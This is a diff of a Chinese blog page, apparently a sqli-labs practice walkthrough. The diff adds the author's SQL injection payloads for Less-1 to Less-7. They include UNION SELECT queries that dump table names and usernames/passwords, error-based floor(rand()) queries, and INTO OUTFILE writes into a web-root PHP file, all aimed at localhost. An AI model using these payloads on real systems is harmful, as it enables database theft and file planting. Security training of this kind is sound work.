@@ -169,14 +169,31 @@
       <span class="post-info-item"><i class="iconfont iconcalendar"></i>November 09, 2020</span
         class="post-info-item">
       
-      <span class="post-info-item"><i class="iconfont iconfont-size"></i>3372</span>
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>5085</span>
     </div>
   </div>
 </section>
     <section class="main">
       <section class="content">
         <h1 id="sqli-labs-–持续更新"><a href="#sqli-labs-–持续更新" class="headerlink" title="sqli-labs    –持续更新"></a>sqli-labs    –持续更新</h1><p>SQL注入漏洞形成的原因是用户输入的数据被SQL解释器执行<br>常见的SQL注入类型包括：数字型和字符型。（还有更详细的划分，但大体上就分为这两个）<br>下面开始以sqli-labs为例，一起学习SQL注入  </p>
-<h2 id="GET基于报错的SQL注入发现"><a href="#GET基于报错的SQL注入发现" class="headerlink" title="GET基于报错的SQL注入发现"></a>GET基于报错的SQL注入发现</h2><h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1:"></a>less-1:</h3><p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/1.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><br>题目提示：输入ID，于是构造如下url：<br><img   class="lazyload" data-original="/2020/11/09/sqlilabs/2.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><br>为了猜有几个id便慢慢试，到<code>id=15</code>没有回显，故一共有14个id<br>使用单引号注入，报错：<br><img   class="lazyload" data-original="/2020/11/09/sqlilabs/3.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><br>因为报错内容是<code>&#39;1&#39;&#39; LIMIT 0,1</code><br>所以猜测其SQL语句是：<br><code>seclet login_name,password from table where id = &#39;ID&#39; LIMIT 0,1</code><br>所以当我们输入<code>id=1&#39;</code>时1后面的引号会将SQL语句中ID的前一个引号闭合，让SQL语句变为<code>seclet login_name,password from table where id = &#39;1&#39;&#39; LIMIT 0,1</code> ，导致报错。<br>下一步就是利用<code>order by</code>爆出表中列的个数：<br><img   class="lazyload" data-original="/2020/11/09/sqlilabs/4.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><br>当<code>order by</code>后面接4列的时候报错，因此可以推测出有3列。<br>下一步，使用<code>union select</code>查看回显的位置<br><img   class="lazyload" data-original="/2020/11/09/sqlilabs/5.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><br>发现第2、3列均有回显。<br>接下来需要用到如下函数：<br>（1）<code>version（）</code>：查看数据库版本<br>（2）<code>user（）</code>：查看当前用户<br>（3）<code>database（）</code>：查看使用的数据库<br>（4） <code>limit  </code>:limit子句来分批获取所有数据<br>（5）<code>group_concat（）</code>：一次性获取数据库信息。<br><br><br>有了这些函数就开始爆版本、用户、数据库：<br><img   class="lazyload" data-original="/2020/11/09/sqlilabs/6.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><br>在这里，<code>database()</code>对我们是有用的，因为我们要进入这个数据库查看login_name和password<br>首先查看表名<br><img   class="lazyload" data-original="/2020/11/09/sqlilabs/7.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><br>接着查看列名：<br><img   class="lazyload" data-original="/2020/11/09/sqlilabs/8.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><br>最后爆破username和password<br><img   class="lazyload" data-original="/2020/11/09/sqlilabs/9.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<h2 id="GET基于报错的SQL注入发现"><a href="#GET基于报错的SQL注入发现" class="headerlink" title="GET基于报错的SQL注入发现"></a>GET基于报错的SQL注入发现</h2><h3 id="less-1"><a href="#less-1" class="headerlink" title="less-1:"></a>less-1:</h3><p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/1.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><br>题目提示：输入ID，于是构造如下url：  </p>
+<p><code>?id=1</code></p>
+<p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/2.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><br>为了猜有几个id便慢慢试，到<code>id=15</code>没有回显，故一共有14个id<br>使用单引号注入，报错：<br><img   class="lazyload" data-original="/2020/11/09/sqlilabs/3.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><br>因为报错内容是<code>&#39;1&#39;&#39; LIMIT 0,1</code><br>所以猜测其SQL语句是：<br><code>seclet login_name,password from table where id = &#39;ID&#39; LIMIT 0,1</code><br>所以当我们输入<code>id=1&#39;</code>时1后面的引号会将SQL语句中ID的前一个引号闭合，让SQL语句变为<code>seclet login_name,password from table where id = &#39;1&#39;&#39; LIMIT 0,1</code> ，导致报错。<br>下一步就是利用<code>order by</code>爆出表中列的个数：  </p>
+<p><code>?id=1&#39; order by 3 --+</code></p>
+<p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/4.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><br>当<code>order by</code>后面接4列的时候报错，因此可以推测出有3列。<br>下一步，使用<code>union select</code>查看回显的位置  </p>
+<p><code>?id=0&#39; union select 1,2,3 --+</code></p>
+<p><em>这里有个疑问：不知道为什么要选择一个不存在的id才能回显</em></p>
+<p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/5.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ><br>发现第2、3列均有回显。<br>接下来需要用到如下函数：<br>（1）<code>version（）</code>：查看数据库版本<br>（2）<code>user（）</code>：查看当前用户<br>（3）<code>database（）</code>：查看使用的数据库<br>（4） <code>limit  </code>:limit子句来分批获取所有数据<br>（5）<code>group_concat（）</code>：一次性获取数据库信息。<br><br><br>有了这些函数就开始爆版本、用户、数据库：  </p>
+<ol>
+<li>查看数据库、版本、用户：<code>?id=0&#39; union select 1,2,group_concat(database(),&#39;,&#39;,version(),&#39;,&#39;,user()) --+</code></li>
+</ol>
+<p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/6.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" >  </p>
+<p>在这里，<code>database()</code>对我们是有用的，因为我们要进入这个数据库查看login_name和password  </p>
+<ol start="2">
+<li>接着查看表名：<code>?id=0&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code><br><img   class="lazyload" data-original="/2020/11/09/sqlilabs/7.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" >   </li>
+<li>再接着查看列名： <code>?id=0&#39;union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() --+</code><br><img   class="lazyload" data-original="/2020/11/09/sqlilabs/8.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" >  </li>
+<li>最后爆破username和password  ：<code>?id=0&#39; union select 1,2,group_concat(username,password) from users --+</code><br><img   class="lazyload" data-original="/2020/11/09/sqlilabs/9.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></li>
+</ol>
 <h3 id="less-2"><a href="#less-2" class="headerlink" title="less-2:"></a>less-2:</h3><p>报错语句：<code>&#39;LIMIT 0,1     </code><br>由此猜测其SQL语句：<br><code>select * from table where id=ID LIMIT 0,1</code>  </p>
 <h3 id="less-3"><a href="#less-3" class="headerlink" title="less-3:"></a>less-3:</h3><p>报错语句：<code>&#39;1&#39;&#39;) LIMIT 0,1  </code><br>由此猜测其SQL语句：<br><code>select * from table where id=(&#39;ID&#39;) LIMIT 0,1    </code></p>
 <h3 id="less-4"><a href="#less-4" class="headerlink" title="less-4:"></a>less-4:</h3><p>注入单引号没反应，但注入双引号报错<br>报错语句：<code>&quot;1&quot;&quot;) LIMIT 0,1  </code><br>由此猜测其SQL语句：<br><code>select * from table where id=(&quot;ID&quot;) LIMIT 0,1</code></p>
@@ -276,7 +293,7 @@
 <ol start="2">
 <li>查询表名</li>
 </ol>
-<p><code>http://localhost/sqli-labs-master/Less-5/?id=1&#39; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand()*2))as a from information_schema.tables group by a --+</code></p>
+<p><code>http://localhost/sqli-labs-master/Less-5/?id=1&#39; union select 1,count(*),concat((select table_name from information_schema.tables where table_schema=database() limit 0,1),floor(rand()*2))as a from information_schema.tables group by a --+</code>0</p>
 <p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/18.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
 <p>这里只能返回一列，因此通过改变<code>Limit 0,1</code>来遍历</p>
 <p><code>limit</code>用法：</p>
@@ -296,6 +313,42 @@
 <p><code>http://localhost/sqli-labs-master/Less-5/?id=1&#39; union select 1,count(*),concat((select username from users limit 0,1),floor(rand()*2))as a from information_schema.tables group by a --+</code></p>
 <p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/22.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
 <h3 id="less-6"><a href="#less-6" class="headerlink" title="less-6:"></a>less-6:</h3><p>其他都和less-5一样，但less-6使用双引号闭合字符串</p>
+<h2 id="Dump-into-outfile"><a href="#Dump-into-outfile" class="headerlink" title="Dump into outfile"></a>Dump into outfile</h2><h3 id="less-7："><a href="#less-7：" class="headerlink" title="less-7："></a>less-7：</h3><p>看标题就知道，在做题前需要了解一些函数</p>
+<table>
+<thead>
+<tr>
+<th>函数名</th>
+<th>作用</th>
+<th>用法</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>into outfile()</td>
+<td>写文件</td>
+<td>A into outfile “绝对路径”</td>
+</tr>
+</tbody></table>
+<p>在做实验前要先在<code>my.ini</code>文件中添加<code>secure_file_priv=&quot;&quot;</code>，目的是使得写入文件的路径无限制</p>
+<p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/29.jpg" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p>接下来开始看Less-7：</p>
+<ol>
+<li><p>先猜出闭合字符串的方式：<code>http://localhost/sqli-labs-master/Less-7/?id=1&#39;)) --+</code></p>
+<p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/23.JPG" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+</li>
+<li><p>题目提示使用outfile，结合union select 使用，查看数据库名，虽然报错但是仍然生成了一个ttttest.php文件，打开正是数据库名：<code>http://localhost/sqli-labs-master/Less-7/?id=0&#39;)) union select 1,2,database() into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\ttttest.php&quot; --+</code></p>
+<p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/24.JPG" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+<p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/25.JPG" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+</li>
+<li><p>查看表名：<code>http://localhost/sqli-labs-master/Less-7/?id=0&#39;)) union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\ttttest.php&quot; --+</code></p>
+<p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/26.JPG" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+</li>
+<li><p>查看列名：<code>http://localhost/sqli-labs-master/Less-7/?id=0&#39;)) union select 1,2,group_concat(column_name) from information_schema.columns where table_schema=database() into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\ttttest.php&quot; --+</code></p>
+<p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/27.JPG" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+</li>
+<li><p>爆用户名和密码：<code>http://localhost/sqli-labs-master/Less-7/?id=0&#39;)) union select 1,2,group_concat(username,password) from users into outfile &quot;D:\\phpStudy\\PHPTutorial\\WWW\\ttttest.php&quot; --+</code></p>
+<p><img   class="lazyload" data-original="/2020/11/09/sqlilabs/28.JPG" src="data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==" ></p>
+</li>
+</ol>
 
       </section>
       <section class="extra">
